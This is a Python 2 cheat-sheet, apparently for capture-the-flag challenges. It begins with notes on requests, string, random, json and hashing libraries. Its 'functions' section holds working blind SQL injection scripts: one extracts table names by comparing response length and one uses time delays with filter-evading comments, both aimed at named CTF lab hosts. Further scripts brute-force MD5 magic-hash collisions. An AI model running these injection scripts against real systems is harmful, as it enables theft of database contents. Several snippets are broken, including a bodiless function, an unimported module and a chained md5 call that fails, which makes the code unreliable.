# coding:utf-8

# Mainly devided into two aspects, one is the method of using models,another is integrated function

# 1.models 


# [requests]
url = 'http://4ct10n.cn'
# @session
import requests
res = requests.session()


# @headers
r = requests.get(url)
print r.headers
# alert headers if don't have session
headers = {
	'cookie':'a=xxxx',
	'Content-Type':'application/json;charset=utf-8'
}
r = requests.get(url,headers=headers)
# alert headers if you have session 
res = requests.session()
res.headers['cookie'] = 'a=xxx'
res.get(url)

# @post
data = {
	'a':'xxx',
	'b':'xxx'
}
r = requests.get(url,data=data)# or (url,data) directly

# @get 


payload = {'key1': 'value1', 'key2': 'value2'}
r = requests.get(url, params=payload) #or use url pass data like index.php?a=1&b=2

# @cookies
cookies ={
	'PHPSESSID':'xxxx'# 26 length
}
r = requests.get(url,cookies=cookies)


# @files
files = {
    'file':('4ct10n.jpg',open('/home/yz/图片/33.png','rb'),"image/jpeg")
}
r = requests.get(url,files=files)

# [string]
import string
print string.ascii_letters #  include all kind of letter
print string.ascii_lowercase
print string.ascii_uppercase
print string.digits

# [random]
print random.uniform(10, 20)#18.7356606526  
print random.randint(12, 20)# 12 <= n <= 20
print random.randrange(10, 100, 2)# choose a number in [10,12,14...]
print random.choice(("Tuple", "List", "Dict")) #choice one element from list
print random.sample('123456789',4)# choose 4 ascii in the string 

# [json]
import json
data =  { 'a' : 1, 'b' : 2, 'c' : 3, 'd' : 4, 'e' : 5 } 
json_str = json.dumps(data)
print json_str
jsondata = json.loads(json_str)
print jsondata

# [libnum/binascii/Crypto.Util.number]
import libnum
import binascii 
from  Crypto.Util.number import long_to_bytes,bytes_to_long
s = '12345678'
print bytes_to_long(s),libnum.s2n(s)
s = 3544952156018063160
print libnum.n2s(s),long_to_bytes(s)
s = "12345678"
print binascii.b2a_hex(s),s.encode('hex')
s = '3132333435363738'
print binascii.a2b_hex(s),s.decode('hex')

# [hashlib]
import hashlib
hashlib.md5('hhh').hexdigest()

# 2.functions

def rand_str()


#blind sqlinjection based different content
import requests
cookies={
        'PHPSESSID': '944d46747cd9059f63dc2e103b2fe31a'
}

dic='3_abcdefghijklmnopqrstuvwxyz'
string = ''
for i in range(1,33):
    for j in dic:
        url='http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 and ord((select substr(table_name,{0},1) from information_schema.tables where table_schema=database())) = {1}'.format(str(i),ord(j))
        s=requests.get(url=url , cookies=cookies)
        content=s.content
        length=len(content)
        print length
        if length > 400 :
            string+=j
            break
    print string 

# blind sqlinjection based different content

import requests
url=r'http://web.jarvisoj.com:32787/login.php'
string=''
dic='0123456789abcdefghijklmnopqrstuvwxyz'
for i in range(1,33):
    for j in dic:
        id="/*'XOR(if(ord((select/**/substr(table_name,{0},1)/**/from/**/information_schema.tables/*!where*/table_schema=database()))={1},sleep(3),0))OR'*/".format(str(i),ord(j))
        data={
            'username':id,
            'password': 1
        }
        print j
        s=requests.post(url=url,data=data)
        sec=s.elapsed.seconds
        if sec > 2:
            string+=j
            break
    print string
# md5 crash

import random
import string
import re
def md5(str):
    import hashlib
    m = hashlib.md5().update(str).hexdigest()
    return m

while 1:
    string = ''
    s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4))
    if (re.findall('^0e[0-9]{14,14}$',md5('XIPU'+s)[8:24])):
        print 'XIPU'+s,md5('XIPU'+s)[8:24]


#----------------

import random
import string
def md5(str):
    import hashlib
    m = hashlib.md5()
    m.update(str)
    return m.hexdigest()
while 1:
    string = ''
    s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4))
    if md5(s)[0:6] == '58a204':
        print s

        break 